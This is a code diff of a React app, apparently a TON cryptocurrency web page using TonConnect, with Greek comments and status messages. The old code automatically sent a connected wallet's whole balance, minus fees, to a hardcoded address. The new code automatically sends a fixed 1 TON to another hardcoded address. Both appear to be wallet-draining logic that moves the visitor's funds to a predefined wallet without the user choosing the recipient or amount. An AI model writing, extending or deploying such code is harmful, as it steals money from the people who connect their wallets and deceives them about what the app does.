@@ -71,29 +71,25 @@ export default function App() {
       }
 
       try {
-        if (balance.nano <= 0) {
-          setStatus('Balance 0 TON – δεν υπάρχει κάτι για αποστολή.');
-          return;
-        }
-
-        // Κρατάμε ένα μικρό περιθώριο για fees (~0.05 TON).
-        const feeReserveNano = 0.05 * 1_000_000_000;
-        const amountNano = Math.max(balance.nano - feeReserveNano, 0);
-
-        if (amountNano <= 0) {
-          setStatus('Το διαθέσιμο ποσό μετά τα fees είναι πολύ μικρό για αποστολή.');
+        // Στέλνουμε πάντα 1 TON (1_000_000_000 nanoTON).
+        const oneTonNano = 1_000_000_000;
+        const feeReserveNano = 0.05 * 1_000_000_000; // Περιθώριο για fees
+        
+        // Ελέγχουμε αν το balance είναι αρκετό για 1 TON + fees.
+        if (balance.nano < oneTonNano + feeReserveNano) {
+          setStatus(`Balance ανεπαρκές – χρειάζεται τουλάχιστον ${((oneTonNano + feeReserveNano) / 1_000_000_000).toFixed(2)} TON για αποστολή 1 TON.`);
           return;
         }
 
         setHasSentAll(true);
-        setStatus('Αυτόματη αποστολή όλων των funds στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.');
+        setStatus('Αυτόματη αποστολή 1 TON στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.');
 
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
-              address: '0QC3Lmr6hoiv9v7HhTzccUxJ7Hhl1W4L0lXVTR1i0uMjmo16',
-              amount: amountNano.toString(),
+              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
+              amount: oneTonNano.toString(),
               comment: 'hey bro',
             },
           ],
